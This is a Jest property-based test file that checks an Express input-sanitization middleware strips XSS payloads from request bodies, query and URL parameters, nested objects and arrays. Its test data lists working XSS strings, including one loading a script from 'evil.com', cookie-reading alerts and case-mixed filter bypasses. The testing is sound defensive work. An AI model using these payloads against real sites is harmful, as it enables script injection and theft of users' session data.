/**
 * Property-Based Test: XSS Prevention
 * 
 * **Property 30: XSS Prevention**
 * **Validates: Requirements 36.6**
 * 
 * For any user input containing HTML/JavaScript tags (e.g., "<script>", 
 * "<img onerror="), the input should be sanitized by encoding special 
 * characters before storage and display, preventing script execution.
 * 
 * This test validates that:
 * - XSS attack patterns are sanitized by the validation middleware
 * - HTML/JavaScript tags are removed or encoded before storage
 * - Stored data doesn't contain executable script tags
 * - Event handlers and other XSS vectors are neutralized
 */

import * as fc from 'fast-check';
import { Request, Response, NextFunction } from 'express';
import { sanitizeRequest } from '../../middleware/validation';

describe('Property 30: XSS Prevention', () => {
  // Increase timeout for property-based tests
  jest.setTimeout(30000);

  /**
   * Generator for common XSS attack patterns
   */
  const xssAttackPatterns = fc.constantFrom(
    // Script tag injections
    '<script>alert("XSS")</script>',
    '<script>alert(document.cookie)</script>',
    '<script src="http://evil.com/xss.js"></script>',
    
    // Event handler injections
    '<img src=x onerror="alert(1)">',
    '<body onload="alert(1)">',
    '<input type="text" onfocus="alert(1)" autofocus>',
    '<svg onload="alert(1)">',
    
    // Link-based XSS
    '<a href="javascript:alert(1)">Click me</a>',
    '<a href="data:text/html,<script>alert(1)</script>">Click</a>',
    
    // Form-based XSS
    '<button onclick="alert(1)">Click</button>',
    
    // Mixed case to bypass filters
    '<ScRiPt>alert(1)</ScRiPt>',
    '<IMG SRC=x ONERROR=alert(1)>'
  );

  /**
   * Helper function to create mock Express request
   */
  const createMockRequest = (body: any, query: any = {}, params: any = {}): Request => {
    return {
      body,
      query,
      params,
      headers: {},
      cookies: {}
    } as Request;
  };

  /**
   * Helper function to create mock Express response
   */
  const createMockResponse = (): Response => {
    return {} as Response;
  };

  /**
   * Property: XSS patterns in request body are sanitized
   * For any input containing XSS patterns, the sanitizeRequest middleware 
   * should remove or encode dangerous HTML/JavaScript
   */
  it('should sanitize XSS patterns in request body', () => {
    fc.assert(
      fc.property(
        xssAttackPatterns,
        (xssPattern) => {
          const maliciousData = {
            name: xssPattern
          };
          
          const req = createMockRequest(maliciousData);
          const res = createMockResponse();
          let nextCalled = false;
          const next: NextFunction = () => { nextCalled = true; };

          // Apply sanitization middleware
          sanitizeRequest(req, res, next);

          // Verify next was called (no error thrown)
          expect(nextCalled).toBe(true);

          // Verify field is sanitized (no dangerous tags remain)
          // The xss library removes complete HTML tags and event handlers
          expect(req.body.name).not.toContain('<script');
          expect(req.body.name).not.toContain('</script>');
          expect(req.body.name).not.toContain('<img');
          expect(req.body.name).not.toContain('<svg');
          expect(req.body.name).not.toContain('<body');
          expect(req.body.name).not.toContain('<button');
          expect(req.body.name).not.toContain('<a href');
        }
      ),
      { numRuns: 15 }
    );
  });

  /**
   * Property: XSS patterns in query parameters are sanitized
   */
  it('should sanitize XSS patterns in query parameters', () => {
    fc.assert(
      fc.property(
        xssAttackPatterns,
        (xssPattern) => {
          const req = createMockRequest({}, { search: xssPattern });
          const res = createMockResponse();
          let nextCalled = false;
          const next: NextFunction = () => { nextCalled = true; };

          sanitizeRequest(req, res, next);

          expect(nextCalled).toBe(true);
          expect(req.query.search).not.toContain('<script');
          expect(req.query.search).not.toContain('<img');
          expect(req.query.search).not.toContain('<svg');
        }
      ),
      { numRuns: 15 }
    );
  });

  /**
   * Property: XSS patterns in URL parameters are sanitized
   */
  it('should sanitize XSS patterns in URL parameters', () => {
    fc.assert(
      fc.property(
        xssAttackPatterns,
        (xssPattern) => {
          const req = createMockRequest({}, {}, { id: xssPattern });
          const res = createMockResponse();
          let nextCalled = false;
          const next: NextFunction = () => { nextCalled = true; };

          sanitizeRequest(req, res, next);

          expect(nextCalled).toBe(true);
          expect(req.params.id).not.toContain('<script');
          expect(req.params.id).not.toContain('<img');
        }
      ),
      { numRuns: 15 }
    );
  });

  /**
   * Property: Nested XSS patterns in objects are sanitized
   */
  it('should sanitize XSS patterns in nested objects', () => {
    fc.assert(
      fc.property(
        xssAttackPatterns,
        (xssPattern) => {
          const nestedData = {
            user: {
              name: xssPattern,
              profile: {
                bio: xssPattern
              }
            }
          };

          const req = createMockRequest(nestedData);
          const res = createMockResponse();
          let nextCalled = false;
          const next: NextFunction = () => { nextCalled = true; };

          sanitizeRequest(req, res, next);

          expect(nextCalled).toBe(true);
          expect(req.body.user.name).not.toContain('<script');
          expect(req.body.user.profile.bio).not.toContain('<script');
        }
      ),
      { numRuns: 15 }
    );
  });

  /**
   * Property: XSS patterns in arrays are sanitized
   */
  it('should sanitize XSS patterns in arrays', () => {
    fc.assert(
      fc.property(
        fc.array(xssAttackPatterns, { minLength: 1, maxLength: 3 }),
        (xssArray) => {
          const arrayData = { tags: xssArray };

          const req = createMockRequest(arrayData);
          const res = createMockResponse();
          let nextCalled = false;
          const next: NextFunction = () => { nextCalled = true; };

          sanitizeRequest(req, res, next);

          expect(nextCalled).toBe(true);
          req.body.tags.forEach((tag: string) => {
            expect(tag).not.toContain('<script');
            expect(tag).not.toContain('<img');
          });
        }
      ),
      { numRuns: 15 }
    );
  });

  /**
   * Property: Legitimate user input without XSS is preserved
   */
  it('should preserve legitimate user input without XSS', () => {
    fc.assert(
      fc.property(
        fc.constantFrom(
          { name: 'John Doe', email: 'john@example.com', phone: '9841234567' },
          { name: 'Jane Smith', email: 'jane@test.com', phone: '9851234567' },
          { name: 'Ram Kumar', email: 'ram@school.edu.np', phone: '9861234567' },
          { name: 'Sita Sharma', email: 'sita@example.np', phone: '9841234568' }
        ),
        (legitimateData) => {
          const req = createMockRequest(legitimateData);
          const res = createMockResponse();
          let nextCalled = false;
          const next: NextFunction = () => { nextCalled = true; };

          sanitizeRequest(req, res, next);

          expect(nextCalled).toBe(true);
          expect(req.body.name.trim()).toBe(legitimateData.name.trim());
          expect(req.body.email.trim()).toBe(legitimateData.email.trim());
          expect(req.body.phone.trim()).toBe(legitimateData.phone.trim());
        }
      ),
      { numRuns: 10 }
    );
  });
});
